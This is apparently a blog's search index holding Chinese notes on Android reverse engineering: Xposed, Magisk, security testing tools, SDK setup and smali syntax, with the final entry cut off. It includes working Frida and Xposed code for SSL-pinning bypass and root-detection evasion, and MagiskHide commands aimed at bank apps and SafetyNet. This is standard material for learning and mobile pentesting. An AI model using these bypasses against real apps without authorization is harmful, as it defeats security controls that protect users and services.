[

  {
    "title"    : "「安卓」:Xposed框架安装与模块开发",
    "category" : "",
    "tags"     : "笔记, Android Reverse, Xposed",
    "url"      : "/blog/2025/Android-Xposed-Framework-Setup/",
    "date"     : "Jun 12, 2025",
    "content"  : "Xposed框架简介Xposed框架是Android平台上最强大的Hook框架之一，它允许在不修改APK的情况下影响程序运行，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。一、Xposed框架安装1.1环境要求Root权限的Android设备解锁Bootloader自定义Recovery（TWRP推荐）1.2安装步骤方法一：通过XposedInstaller安装#下载XposedInstallerAPKwgethttps://repo.xposed.info/module/de.robv.android.xposed.installeradbinstallXposedInstaller_3.1.5.apk#在应用中选择对应架构的框架包进行安装#支持架构：arm,arm64,x86,x86_64方法二：通过Recovery刷入#下载对应架构的框架包#例如：xposed-v90-sdk25-arm64.zip#进入Recovery模式adbrebootrecovery#在TWRP中选择Install，刷入框架包#重启设备完成安装1.3安装验证#检查Xposed是否正常运行adbshellsuls-la/system/bin/app_process*#查看Xposed日志logcat|grep-ixposed二、Xposed模块开发2.1开发环境配置创建Android项目//app/build.gradleandroid{compileSdkVersion30defaultConfig{applicationId\"com.example.xposedmodule\"minSdkVersion21targetSdkVersion30versionCode1versionName\"1.0\"}}dependencies{compileOnly'de.robv.android.xposed:api:82'compileOnly'de.robv.android.xposed:api:82:sources'}配置模块信息&lt;!--AndroidManifest.xml--&gt;&lt;application&gt;&lt;meta-dataandroid:name=\"xposedmodule\"android:value=\"true\"/&gt;&lt;meta-dataandroid:name=\"xposeddescription\"android:value=\"Root权限隐藏模块\"/&gt;&lt;meta-dataandroid:name=\"xposedminversion\"android:value=\"54\"/&gt;&lt;/application&gt;2.2Hook实现示例主Hook类publicclassMainHookimplementsIXposedHookLoadPackage{@OverridepublicvoidhandleLoadPackage(XC_LoadPackage.LoadPackageParamlpparam)throwsThrowable{//HookRoot检测相关方法if(lpparam.packageName.equals(\"com.target.app\")){hookRootDetection(lpparam);}}privatevoidhookRootDetection(XC_LoadPackage.LoadPackageParamlpparam){//Hooksu命令检测XposedHelpers.findAndHookMethod(\"java.lang.Runtime\",lpparam.classLoader,\"exec\",String.class,newXC_MethodHook(){@OverrideprotectedvoidbeforeHookedMethod(MethodHookParamparam)throwsThrowable{Stringcommand=(String)param.args[0];if(command.contains(\"su\")||command.contains(\"whichsu\")){param.setResult(null);}}});//Hook文件存在性检测XposedHelpers.findAndHookMethod(\"java.io.File\",lpparam.classLoader,\"exists\",newXC_MethodHook(){@OverrideprotectedvoidbeforeHookedMethod(MethodHookParamparam)throwsThrowable{Filefile=(File)param.thisObject;Stringpath=file.getAbsolutePath();//隐藏常见Root文件if(isRootPath(path)){param.setResult(false);}}});}privatebooleanisRootPath(Stringpath){String[]rootPaths={\"/system/bin/su\",\"/system/xbin/su\",\"/sbin/su\",\"/system/app/Superuser.apk\",\"/system/app/SuperSU.apk\"};for(StringrootPath:rootPaths){if(path.equals(rootPath)){returntrue;}}returnfalse;}}2.3模块入口配置#assets/xposed_initcom.example.xposedmodule.MainHook三、常见问题解决3.1框架安装失败#检查设备架构adbshellgetpropro.product.cpu.abi#确保下载正确架构的框架包#arm64-v8a-&gt;arm64#armeabi-v7a-&gt;arm3.2模块不生效#检查模块是否被Xposed识别adbshellsuls/data/data/de.robv.android.xposed.installer/conf/modules.list#查看Xposed日志logcat-sXposed3.3系统启动异常#进入Recovery模式#删除Xposed框架文件mount/systemrm/system/bin/app_process32_xposedrm/system/bin/app_process64_xposedmv/system/bin/app_process32_original/system/bin/app_process32mv/system/bin/app_process64_original/system/bin/app_process64四、高级技巧4.1动态Hook//运行时Hook方法publicvoiddynamicHook(StringclassName,StringmethodName){Class&lt;?&gt;clazz=XposedHelpers.findClass(className,lpparam.classLoader);XposedBridge.hookAllMethods(clazz,methodName,newXC_MethodHook(){@OverrideprotectedvoidafterHookedMethod(MethodHookParamparam)throwsThrowable{//Hook逻辑}});}4.2资源Hook@OverridepublicvoidhandleInitPackageResources(XC_InitPackageResources.InitPackageResourcesParamresparam)throwsThrowable{if(!resparam.packageName.equals(\"com.target.app\"))return;//Hook字符串资源resparam.res.setReplacement(\"com.target.app\",\"string\",\"app_name\",\"ModifiedApp\");}参考资料XposedFramework官方文档Xposed模块开发教程AndroidHook技术详解"
  },

  {
    "title"    : "「安卓」:Android安全测试工具集与实战应用",
    "category" : "",
    "tags"     : "笔记, Android Reverse, 安全测试",
    "url"      : "/blog/2025/Android-Security-Testing-Tools/",
    "date"     : "Jun 12, 2025",
    "content"  : "Android安全测试工具概述Android安全测试涉及多个层面，包括静态分析、动态分析、网络流量分析、以及各种绕过技术。本文将介绍常用的Android安全测试工具及其配置使用方法。一、静态分析工具1.1APKTool-APK反编译工具#安装APKToolwgethttps://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktoolwgethttps://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.7.0.jarchmod+xapktoolsudomvapktool/usr/local/bin/sudomvapktool_2.7.0.jar/usr/local/bin/apktool.jar#反编译APKapktooldapp.apk-oapp_decompiled#重新打包APKapktoolbapp_decompiled-oapp_modified.apk#签名修改后的APKjarsigner-verbose-sigalgSHA1withRSA-digestalgSHA1-keystoredebug.keystoreapp_modified.apkandroiddebugkey1.2dex2jar-DEX转JAR工具#下载安装dex2jarwgethttps://github.com/pxb1988/dex2jar/releases/download/v2.2/dex-tools-2.2.zipunzipdex-tools-2.2.zipexportPATH=$PATH:$(pwd)/dex-tools-2.2#转换APK为JARd2j-dex2jar.shapp.apk#使用JD-GUI查看源码java-jarjd-gui-1.6.6.jarapp-dex2jar.jar1.3JADX-现代化反编译工具#安装JADXwgethttps://github.com/skylot/jadx/releases/download/v1.4.7/jadx-1.4.7.zipunzipjadx-1.4.7.zip-djadxexportPATH=$PATH:$(pwd)/jadx/bin#反编译APKjadxapp.apk-doutput_directory#使用GUI版本jadx-guiapp.apk1.4常见静态分析问题解决#问题1：反编译失败-资源解析错误#解决方案：跳过资源文件反编译apktooldapp.apk-r-oapp_decompiled#问题2：重打包后安装失败#解决方案：对齐APK文件zipalign-v4app_modified.apkapp_aligned.apk#问题3：混淆代码难以分析#解决方案：使用多种工具交叉验证jadxapp.apk-djadx_outputd2j-dex2jar.shapp.apk二、动态分析工具2.1Frida-动态插桩框架#安装Fridapip3installfrida-tools#下载frida-serverwgethttps://github.com/frida/frida/releases/download/16.0.19/frida-server-16.0.19-android-arm64.xzunxzfrida-server-16.0.19-android-arm64.xz#推送到设备并启动adbpushfrida-server-16.0.19-android-arm64/data/local/tmp/frida-serveradbshell\"chmod755/data/local/tmp/frida-server\"adbshell\"/data/local/tmp/frida-server&amp;\"#验证Frida连接frida-ps-U2.2Frida脚本示例//hook_example.js-SSLPinning绕过Java.perform(function(){//HookOkHttp3CertificatePinnervarCertificatePinner=Java.use(\"okhttp3.CertificatePinner\");CertificatePinner.check.overload(\"java.lang.String\",\"java.util.List\").implementation=function(hostname,peerCertificates){console.log(\"[+]SSLPinningbypassedfor:\"+hostname);return;};//HookHttpsURLConnectionvarHttpsURLConnection=Java.use(\"javax.net.ssl.HttpsURLConnection\");HttpsURLConnection.setDefaultHostnameVerifier.implementation=function(hostnameVerifier){console.log(\"[+]Defaulthostnameverifierbypassed\");return;};//HookTrustManagervarX509TrustManager=Java.use(\"javax.net.ssl.X509TrustManager\");varTrustManager=Java.registerClass({name:\"com.example.TrustManager\",implements:[X509TrustManager],methods:{checkClientTrusted:function(chain,authType){},checkServerTrusted:function(chain,authType){},getAcceptedIssuers:function(){return[];}}});});2.3使用Frida进行Hook#启动应用并注入脚本frida-U-fcom.example.app-lhook_example.js--no-pause#Hook运行中的应用frida-Ucom.example.app-lhook_example.js#交互式Hookfrida-Ucom.example.app三、网络流量分析工具3.1BurpSuite配置#配置BurpSuite代理#1.启动BurpSuite，设置代理监听端口8080#2.导出CA证书#在Android设备上配置代理adbshellsettingsputglobalhttp_proxy192.168.1.100:8080#安装BurpSuite证书adbpushcacert.der/sdcard/#在设备设置中安装证书：设置-&gt;安全-&gt;安装证书3.2自定义证书生成#生成自签名证书（有效期1年）opensslreq-x509-nodes-days365-newkeyrsa:2048-keyoutburp.key-outburp.crt-subj\"/C=US/ST=CA/L=SF/O=Test/CN=BurpSuite\"#转换为PKCS12格式opensslpkcs12-export-outburp.p12-inkeyburp.key-inburp.crt-passwordpass:password#在BurpSuite中导入证书#Proxy-&gt;Options-&gt;Import/exportCAcertificate-&gt;Import-&gt;CertificateandprivatekeyinPKCS#12format3.3mitmproxy使用#安装mitmproxypip3installmitmproxy#启动mitmproxymitmproxy-p8080#启动mitmdump（命令行模式）mitmdump-p8080-sscript.py#获取mitmproxy证书curl-xhttp://localhost:8080http://mitm.it/cert/pem&gt;mitmproxy-ca-cert.pem四、Root检测绕过工具4.1RootCloakPlus配置#安装RootCloakPlus（需要Xposed框架）#1.下载RootCloakPlusAPK#2.在XposedInstaller中激活模块#3.重启设备#配置隐藏应用列表#在RootCloakPlus中添加需要隐藏Root的应用包名4.2MagiskHide配置#启用MagiskHidemagiskhideenable#添加应用到隐藏列表magiskhideaddcom.example.bankappmagiskhideaddcom.google.android.gms.safetynet#查看隐藏状态magiskhidestatus#随机化Magisk包名magisk--random-package-name4.3自定义Root隐藏脚本//root_hide.js-FridaRoot隐藏脚本Java.perform(function(){//Hooksu命令执行varRuntime=Java.use(\"java.lang.Runtime\");Runtime.exec.overload(\"java.lang.String\").implementation=function(command){if(command.indexOf(\"su\")!==-1){console.log(\"[+]Blockedsucommand:\"+command);thrownewError(\"Commandnotfound\");}returnthis.exec(command);};//Hook文件存在性检查varFile=Java.use(\"java.io.File\");File.exists.implementation=function(){varpath=this.getAbsolutePath();varrootPaths=[\"/system/bin/su\",\"/system/xbin/su\",\"/sbin/su\"];if(rootPaths.indexOf(path)!==-1){console.log(\"[+]Hidingrootfile:\"+path);returnfalse;}returnthis.exists();};//HookBuild属性varBuild=Java.use(\"android.os.Build\");Build.TAGS.value=\"release-keys\";Build.TYPE.value=\"user\";});五、自动化测试工具5.1MobSF-移动安全框架#安装MobSFgitclonehttps://github.com/MobSF/Mobile-Security-Framework-MobSF.gitcdMobile-Security-Framework-MobSF#使用Docker运行dockerbuild-tmobsf.dockerrun-it-p8000:8000mobsf#或直接安装pip3install-rrequirements.txtpython3manage.pyrunserver0.0.0.0:80005.2QARK-快速Android审查工具#安装QARKpip3installqark#分析APK文件qark--apkapp.apk#分析源码目录qark--java/path/to/source/code5.3AndroBugsFramework#下载AndroBugsgitclonehttps://github.com/AndroBugs/AndroBugs_Framework.gitcdAndroBugs_Framework#安装依赖pip3install-rrequirements.txt#分析APKpython3androbugs.py-fapp.apk六、实战测试流程6.1完整测试流程#!/bin/bash#android_security_test.sh-自动化安全测试脚本APK_FILE=$1OUTPUT_DIR=\"security_test_$(date+%Y%m%d_%H%M%S)\"echo\"[+]StartingAndroidSecurityTestfor:$APK_FILE\"mkdir-p$OUTPUT_DIR#1.静态分析echo\"[+]Step1:StaticAnalysis\"apktoold$APK_FILE-o$OUTPUT_DIR/apktool_outputjadx$APK_FILE-d$OUTPUT_DIR/jadx_outputd2j-dex2jar.sh$APK_FILE-o$OUTPUT_DIR/app.jar#2.信息收集echo\"[+]Step2:InformationGathering\"aaptdumpbadging$APK_FILE&gt;$OUTPUT_DIR/app_info.txtstrings$APK_FILE|grep-E\"(http|https|ftp)://\"&gt;$OUTPUT_DIR/urls.txtstrings$APK_FILE|grep-E\"([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)\"&gt;$OUTPUT_DIR/emails.txt#3.证书分析echo\"[+]Step3:CertificateAnalysis\"unzip-p$APK_FILEMETA-INF/*.RSA|opensslpkcs7-informDER-print_certs-text&gt;$OUTPUT_DIR/certificate.txt#4.权限分析echo\"[+]Step4:PermissionAnalysis\"aaptdumppermissions$APK_FILE&gt;$OUTPUT_DIR/permissions.txtecho\"[+]Securitytestcompleted.Resultssavedin:$OUTPUT_DIR\"6.2动态测试脚本//dynamic_test.js-综合动态测试脚本Java.perform(function(){console.log(\"[+]Startingdynamicsecuritytest\");//1.网络请求监控varURL=Java.use(\"java.net.URL\");URL.$init.overload(\"java.lang.String\").implementation=function(url){console.log(\"[+]Networkrequest:\"+url);returnthis.$init(url);};//2.文件操作监控varFileOutputStream=Java.use(\"java.io.FileOutputStream\");FileOutputStream.$init.overload(\"java.lang.String\").implementation=function(filename){console.log(\"[+]Filewrite:\"+filename);returnthis.$init(filename);};//3.数据库操作监控varSQLiteDatabase=Java.use(\"android.database.sqlite.SQLiteDatabase\");SQLiteDatabase.execSQL.overload(\"java.lang.String\").implementation=function(sql){console.log(\"[+]SQLexecution:\"+sql);returnthis.execSQL(sql);};//4.加密操作监控varCipher=Java.use(\"javax.crypto.Cipher\");Cipher.doFinal.overload(\"[B\").implementation=function(input){console.log(\"[+]Cryptooperationdetected\");returnthis.doFinal(input);};});七、常见问题解决7.1工具兼容性问题#问题1：APKTool版本不兼容#解决方案：使用最新版本或指定版本wgethttps://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.7.0.jar#问题2：Frida连接失败#解决方案：检查frida-server版本匹配frida--versionadbshell\"/data/local/tmp/frida-server--version\"#问题3：证书安装失败#解决方案：转换证书格式opensslx509-informDER-incacert.der-outcacert.pemopensslx509-informPEM-outformDER-incacert.pem-outcacert.crt7.2权限问题解决#SELinux权限问题adbshellsetenforce0#文件权限问题adbshellchmod755/data/local/tmp/frida-server#Root权限获取adbshellsu-c\"your_command\"参考资料OWASPMobileSecurityTestingGuideFrida官方文档Android安全测试最佳实践MobSF使用指南"
  },

  {
    "title"    : "「安卓」:Magisk Root管理与模块系统",
    "category" : "",
    "tags"     : "笔记, Android Reverse, Magisk",
    "url"      : "/blog/2025/Android-Magisk-Root-Management/",
    "date"     : "Jun 12, 2025",
    "content"  : "Magisk简介Magisk是一套开源的Android自定义工具，支持Android5.0以上版本。它提供了root权限管理、boot镜像修改、以及模块系统等功能。与传统的SuperSU不同，Magisk采用了”Systemless”的方式，不直接修改系统分区，而是通过修改boot镜像来实现root功能。一、Magisk安装配置1.1环境准备#检查设备信息adbshellgetpropro.build.version.releaseadbshellgetpropro.product.cpu.abiadbshellgetpropro.build.version.sdk#确保设备已解锁Bootloaderfastbootoemdevice-infofastbootgetvarunlocked1.2获取boot镜像#方法一：从官方固件包提取#下载对应版本的官方固件包，解压获取boot.img#方法二：从设备直接提取adbshellsuddif=/dev/block/bootdevice/by-name/bootof=/sdcard/boot.imgadbpull/sdcard/boot.img1.3安装MagiskManager#下载最新版本MagiskManagerAPKwgethttps://github.com/topjohnwu/Magisk/releases/latest/download/Magisk-v25.2.apkadbinstallMagisk-v25.2.apk1.4修补boot镜像#将boot.img推送到设备adbpushboot.img/sdcard/#在MagiskManager中选择\"安装\"-&gt;\"选择并修补一个文件\"#选择/sdcard/boot.img进行修补#修补完成后会生成magisk_patched-*.img文件#拉取修补后的镜像adbpull/sdcard/Download/magisk_patched-25200_xxxxx.img1.5刷入修补镜像#重启到fastboot模式adbrebootbootloader#刷入修补后的boot镜像fastbootflashbootmagisk_patched-25200_xxxxx.img#重启设备fastbootreboot二、MagiskHide配置2.1启用MagiskHide#在MagiskManager中启用MagiskHide功能#设置-&gt;MagiskHide-&gt;启用#命令行方式启用adbshellsumagiskhideenable2.2配置隐藏应用列表#查看可隐藏的应用列表magiskhidels#添加应用到隐藏列表magiskhideaddcom.example.bankappmagiskhideaddcom.google.android.gms#移除应用从隐藏列表magiskhidermcom.example.app#查看当前隐藏列表magiskhidestatus2.3高级隐藏配置#隐藏MagiskManager本身#在MagiskManager中选择\"设置\"-&gt;\"隐藏MagiskManager\"#输入新的包名和应用名#随机化包名magisk--random-package-name#检查隐藏状态getpropro.magisk.hide三、Magisk模块开发3.1模块结构module_root/├──META-INF/│└──com/│└──google/│└──android/│├──update-binary│└──updater-script├──module.prop├──service.sh├──post-fs-data.sh├──uninstall.sh└──system/└──(模块文件)3.2模块配置文件#module.propid=example_modulename=ExampleModuleversion=v1.0versionCode=1author=Bin4xindescription=ThisisanexamplemoduleforMagisk3.3脚本文件说明#service.sh-在late_start服务阶段执行#!/system/bin/sh#在这里添加需要在系统启动后执行的命令#post-fs-data.sh-在post-fs-data阶段执行#!/system/bin/sh#在这里添加需要在文件系统挂载后执行的命令#uninstall.sh-模块卸载时执行#!/system/bin/sh#在这里添加模块卸载时需要执行的清理命令3.4实际模块示例#创建Root隐藏模块mkdir-p/sdcard/root_hide_module/META-INF/com/google/androidmkdir-p/sdcard/root_hide_module/system/bin#创建module.propcat&gt;/sdcard/root_hide_module/module.prop&lt;&lt;EOFid=root_hide_advancedname=AdvancedRootHideversion=v2.0versionCode=2author=Bin4xindescription=AdvancedrootdetectionbypassmoduleEOF#创建service.shcat&gt;/sdcard/root_hide_module/service.sh&lt;&lt;EOF#!/system/bin/sh#修改build.prop属性resetpropro.debuggable0resetpropro.secure1resetpropro.build.typeuserresetpropro.build.tagsrelease-keysEOF四、常见问题解决4.1安装失败问题#检查Magisk版本兼容性adbshellgetpropro.build.version.sdk#清除Magisk数据重新安装adbshellpmclearcom.topjohnwu.magisk#检查boot镜像完整性fastbootgetvarpartition-size:boot4.2模块冲突问题#进入安全模式禁用所有模块#音量减键+电源键启动#手动删除问题模块adbshellsurm-rf/data/adb/modules/problem_module#重启设备reboot4.3MagiskHide失效#重置MagiskHide数据库magiskhidedisablerm/data/adb/magisk.dbmagiskhideenable#检查Zygisk状态magisk--denyliststatus#更新MagiskHide列表magiskhideaddcom.target.app五、高级应用技巧5.1自定义SELinux规则#在模块中添加SELinux规则mkdir-p/data/adb/modules/custom_sepolicy/echo\"allowuntrusted_appsystem_filefileread\"&gt;/data/adb/modules/custom_sepolicy/sepolicy.rule5.2系统属性修改#使用resetprop修改系统属性resetpropro.build.fingerprint\"google/sdk_gphone64_arm64/generic_arm64:11/RSR1.201013.001/6903271:user/release-keys\"resetpropro.build.model\"Pixel4\"5.3文件系统挂载#在post-fs-data.sh中挂载自定义文件mount-obind/data/adb/modules/custom_module/system/lib/libcustom.so/system/lib/libcustom.so参考资料Magisk官方文档Magisk模块开发指南AndroidRoot检测绕过技术"
  },

  {
    "title"    : "「安卓」:Android开发环境配置与常见问题解决",
    "category" : "",
    "tags"     : "笔记, Android Reverse, 开发环境",
    "url"      : "/blog/2025/Android-Development-Environment-Setup/",
    "date"     : "Jun 12, 2025",
    "content"  : "Android开发环境概述Android开发环境的搭建是进行Android逆向分析的基础，包括AndroidSDK、NDK、各种构建工具以及模拟器的配置。本文将详细介绍环境搭建过程中的常见问题及解决方案。一、AndroidSDK配置1.1SDK安装与配置#下载AndroidSDKCommandLineToolswgethttps://dl.google.com/android/repository/commandlinetools-linux-8512546_latest.zip#解压到指定目录unzipcommandlinetools-linux-8512546_latest.zip-d~/android-sdkcd~/android-sdkmkdircmdline-toolsmvtoolscmdline-tools/latest#设置环境变量exportANDROID_HOME=~/android-sdkexportANDROID_SDK_ROOT=$ANDROID_HOMEexportPATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/binexportPATH=$PATH:$ANDROID_HOME/platform-toolsexportPATH=$PATH:$ANDROID_HOME/emulator1.2SDK组件安装#查看可用的SDK包sdkmanager--list#安装必要组件sdkmanager\"platform-tools\"\"platforms;android-30\"\"build-tools;30.0.3\"sdkmanager\"system-images;android-30;google_apis;x86_64\"sdkmanager\"emulator\"\"tools\"#接受许可协议sdkmanager--licenses1.3常见SDK问题解决#问题1：SDKlocationnotfound#解决方案：在项目根目录创建local.properties文件echo\"sdk.dir=$ANDROID_HOME\"&gt;local.properties#问题2：ANDROID_HOME环境变量未设置#解决方案：在~/.bashrc或~/.zshrc中添加环境变量echo'exportANDROID_HOME=~/android-sdk'&gt;&gt;~/.bashrcecho'exportPATH=$PATH:$ANDROID_HOME/platform-tools'&gt;&gt;~/.bashrcsource~/.bashrc#问题3：sdkmanager命令找不到#解决方案：检查cmdline-tools目录结构ls-la$ANDROID_HOME/cmdline-tools/#确保目录结构为：cmdline-tools/latest/bin/sdkmanager二、Gradle构建系统配置2.1Gradle安装配置#下载Gradlewgethttps://services.gradle.org/distributions/gradle-7.4.2-bin.zip#解压安装unzipgradle-7.4.2-bin.zip-d~/gradleexportGRADLE_HOME=~/gradle/gradle-7.4.2exportPATH=$PATH:$GRADLE_HOME/bin#验证安装gradle--version2.2Gradle项目配置//build.gradle(Projectlevel)buildscript{ext.kotlin_version=\"1.6.21\"repositories{google()mavenCentral()jcenter()//已废弃，建议移除}dependencies{classpath\"com.android.tools.build:gradle:7.1.3\"classpath\"org.jetbrains.kotlin:kotlin-gradle-plugin:$kotlin_version\"}}allprojects{repositories{google()mavenCentral()maven{url'https://jitpack.io'}}}//build.gradle(Applevel)android{compileSdkVersion31buildToolsVersion\"31.0.0\"defaultConfig{applicationId\"com.example.myapp\"minSdkVersion21targetSdkVersion31versionCode1versionName\"1.0\"testInstrumentationRunner\"androidx.test.runner.AndroidJUnitRunner\"}buildTypes{release{minifyEnabledfalseproguardFilesgetDefaultProguardFile('proguard-android-optimize.txt'),'proguard-rules.pro'}debug{debuggabletrueapplicationIdSuffix\".debug\"}}compileOptions{sourceCompatibilityJavaVersion.VERSION_1_8targetCompatibilityJavaVersion.VERSION_1_8}}2.3Gradle常见问题解决#问题1：Gradle构建失败-网络问题#解决方案：配置国内镜像源mkdir-p~/.gradlecat&gt;~/.gradle/init.gradle&lt;&lt;EOFallprojects{repositories{maven{url'https://maven.aliyun.com/repository/google'}maven{url'https://maven.aliyun.com/repository/central'}maven{url'https://maven.aliyun.com/repository/gradle-plugin'}maven{url'https://maven.aliyun.com/repository/public'}}}EOF#问题2：GradleDaemon启动失败#解决方案：清理Gradle缓存rm-rf~/.gradle/caches/rm-rf~/.gradle/daemon/#问题3：内存不足错误#解决方案：配置GradleJVM参数echo\"org.gradle.jvmargs=-Xmx4096m-XX:MaxPermSize=512m-XX:+HeapDumpOnOutOfMemoryError-Dfile.encoding=UTF-8\"&gt;&gt;~/.gradle/gradle.propertiesecho\"org.gradle.parallel=true\"&gt;&gt;~/.gradle/gradle.propertiesecho\"org.gradle.configureondemand=true\"&gt;&gt;~/.gradle/gradle.properties三、AndroidNDK配置3.1NDK安装#通过sdkmanager安装NDKsdkmanager\"ndk;23.1.7779620\"#或手动下载安装wgethttps://dl.google.com/android/repository/android-ndk-r23c-linux.zipunzipandroid-ndk-r23c-linux.zip-d~/android-ndkexportANDROID_NDK_HOME=~/android-ndk/android-ndk-r23cexportPATH=$PATH:$ANDROID_NDK_HOME3.2NDK项目配置//build.gradle(Applevel)android{defaultConfig{ndk{abiFilters'arm64-v8a','armeabi-v7a','x86','x86_64'}}externalNativeBuild{cmake{path\"src/main/cpp/CMakeLists.txt\"version\"3.18.1\"}}}#CMakeLists.txtcmake_minimum_required(VERSION3.18.1)project(\"native-lib\")add_library(native-libSHAREDnative-lib.cpp)find_library(log-liblog)target_link_libraries(native-lib${log-lib})3.3NDK常见问题#问题1：NDK版本不兼容#解决方案：在gradle.properties中指定NDK版本echo\"android.ndkVersion=23.1.7779620\"&gt;&gt;gradle.properties#问题2：CMake找不到#解决方案：安装CMakesdkmanager\"cmake;3.18.1\"#问题3：交叉编译工具链问题#解决方案：检查NDK工具链路径ls$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/四、模拟器配置4.1AVD创建与管理#创建AVDavdmanagercreateavd-n\"Pixel_4_API_30\"-k\"system-images;android-30;google_apis;x86_64\"-d\"pixel_4\"#列出所有AVDavdmanagerlistavd#启动模拟器emulator-avdPixel_4_API_30#启动模拟器（无GUI）emulator-avdPixel_4_API_30-no-window-no-audio4.2模拟器性能优化#启用硬件加速emulator-avdPixel_4_API_30-gpuhost#分配更多内存emulator-avdPixel_4_API_30-memory4096#启用快照功能emulator-avdPixel_4_API_30-snapshot-save#配置网络代理emulator-avdPixel_4_API_30-http-proxyhttp://127.0.0.1:80804.3模拟器常见问题#问题1：模拟器启动失败-HAXM问题#解决方案：安装IntelHAXM或启用Hyper-V#Linux用户：确保KVM已启用sudoaptinstallqemu-kvmlibvirt-daemon-systemlibvirt-clientsbridge-utilssudousermod-aGkvm$USER#问题2：模拟器运行缓慢#解决方案：启用硬件加速和增加内存emulator-avdPixel_4_API_30-gpuhost-memory4096-cores4#问题3：网络连接问题#解决方案：配置DNS和代理emulator-avdPixel_4_API_30-dns-server8.8.8.8,8.8.4.4五、开发工具配置5.1AndroidStudio配置#下载AndroidStudiowgethttps://redirector.gvt1.com/edgedl/android/studio/ide-zips/2021.2.1.15/android-studio-2021.2.1.15-linux.tar.gz#解压安装tar-xzfandroid-studio-2021.2.1.15-linux.tar.gz-C~/android-studio~/android-studio/android-studio/bin/studio.sh#配置JVM参数echo\"-Xmx4096m\"&gt;&gt;~/android-studio/android-studio/bin/studio64.vmoptionsecho\"-XX:ReservedCodeCacheSize=512m\"&gt;&gt;~/android-studio/android-studio/bin/studio64.vmoptions5.2命令行工具配置#安装必要的命令行工具sudoaptupdatesudoaptinstallopenjdk-11-jdkgitcurlwgetunzip#配置Java环境exportJAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64exportPATH=$PATH:$JAVA_HOME/bin#验证Java安装java-versionjavac-version5.3签名工具配置#生成调试签名keytool-genkey-v-keystoredebug.keystore-aliasandroiddebugkey-keyalgRSA-keysize2048-validity10000#查看签名信息keytool-list-v-keystoredebug.keystore#使用jarsigner签名APKjarsigner-verbose-sigalgSHA1withRSA-digestalgSHA1-keystoredebug.keystoreapp-debug.apkandroiddebugkey#使用apksigner签名APK（推荐）apksignersign--ksdebug.keystore--ks-key-aliasandroiddebugkeyapp-debug.apk六、环境验证与测试6.1环境完整性检查#检查所有环境变量echo\"ANDROID_HOME:$ANDROID_HOME\"echo\"ANDROID_SDK_ROOT:$ANDROID_SDK_ROOT\"echo\"ANDROID_NDK_HOME:$ANDROID_NDK_HOME\"echo\"JAVA_HOME:$JAVA_HOME\"echo\"GRADLE_HOME:$GRADLE_HOME\"#检查工具可用性adbversionfastboot--versiongradle--versionjava-version6.2创建测试项目#创建新的Android项目mkdirTestProject&amp;&amp;cdTestProject#初始化Gradle项目gradleinit--typebasic#创建基本的Android项目结构mkdir-psrc/main/java/com/example/testmkdir-psrc/main/res/layoutmkdir-psrc/main/res/values#构建项目./gradlewbuild参考资料Android开发者官方文档Gradle构建工具文档AndroidNDK开发指南环境配置问题解决"
  },

  {
    "title"    : "Android逆向学习",
    "category" : "",
    "tags"     : "Android",
    "url"      : "/blog/2025/Android-reverseLearing/",
    "date"     : "Mar 11, 2025",
    "content"  : "Android逆向学习笔记1.Android逆向学习基础知识DavlikAndroidOS的虚拟机，Dalvik基于寄存器，JavaVM基于栈，二者明显区别。Davlik专属文件执行格式dex，比JavaJVM运行快，内存占用少。反编译Apktool、dex2jar+jd-gui，最终修改APK需要操作.smali文件，然后再使用Apktool将修改的文件打包成APK，再使用jarsigner进行APK签名：jarsigner-keystorename.keystoreFolderkeystorealias-keypasspasswdDavlik中寄存器32位，64位类型（Long/Double）用2个寄存器表示，字节码2中类型：原始类型、引用类型（包括对象和数组）B---byteC---charD---doubleF---floatI---intJ---longS---shortV---voidZ---boolean[XXX---arrayLxxx/yyy---object:LpackageName/objectName$subObjectName;smali函数hello()V—&gt;voidhello()hello(III)Z—&gt;booleanhello(int,int,int)hello(Z[I[ILjava/lang/String;J)Ljava/lang/String;—&gt;Stringhello(boolean,int[],int[],String,long)Smali基本语法.fieldprivateisFlag:z定义变量.fieldbutton_login:Landroid/widget/Button;.method方法.methodprotectedonCreate(Landroid/os/Bundle;)V.parameter方法参数.paramp1,“name”#Ljava/lang/String;.prologue方法开始.line36此方法位于36行Invoke-super调用父函数Return-void函数返回voidMove-resultv0上面函数执行的结果赋值给v0.endmethod函数结束New-instance创建实例Input-object对象赋值Iget-object调用对象Invoke-static调用静态函数Invoke-virtual调用函数invoke-virtual{p1,v0},Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)ZConst-stringstring赋值const-stringv0,“snow”smali的条件分支If-eqvA,vB,:cond_**如果vA和vB相等，则跳转至cond_**If-ne（不等于）、if-lt（小于）、if-ge（大于等于）、if-gt（大于）、if-le（小于等于）If-eqzv0:cond_**如果V0等于0，则跳转至condIf-nez（不等于0）、if-ltz、if-gtz、if-gez、if-lez类的声明：.classpublicLcom/aaaa;.superLcom/bbbb;.source“ccc.java”包路径、父类、文件名称#annotations.annotationsystemLdalvik/annotation/MemberClasses;value={Lcom/aaa$qq;Lcom/aaa$bb;}内部类：aaa类的两个成员内部类qq和bb；寄存器V开头的是指本地寄存器，P开头的是指参数寄存器，对于非static函数中,P0代表“this”，P1代表第一个参数，而在static函数中，P0代表第一个参数。const/4v0,0x1input-booleanv0,p0,Lcom/aaa;-&gt;IsRegistered:Z0x1放入本地寄存器v0，input-boolean将v0的值存放在com.aaa.IsRegistered变量中。成员变量：.fieldpublic/private[static][finale]varName:&lt;类型&gt;不同的变量，不同的指令：iget、sget、iget-boolean、sget-boolean、iget-object、sget-object等；input、input-boolean、sput-boolean、iput-object、sput-object等；-object后缀的表示操作对象是对象类型，对boolean类的操作则使用-boolean。Sget-objectv0,Lcom/aaa;-&gt;ID:Ljava/lang/String;获取com.aaa.ID的值放入V0Iget-objectv0,p0,Lcom/aaa;-&gt;view:Lcom/aaa/view;此处多了一个参数p0，指的是this，array变量采用aget和aget-objectthis.timer=nullconst/4v3,0x0sput-objectv3,Lcom/aaa;-timer:Lcom/aaa/timer;.localv0,args:Landroid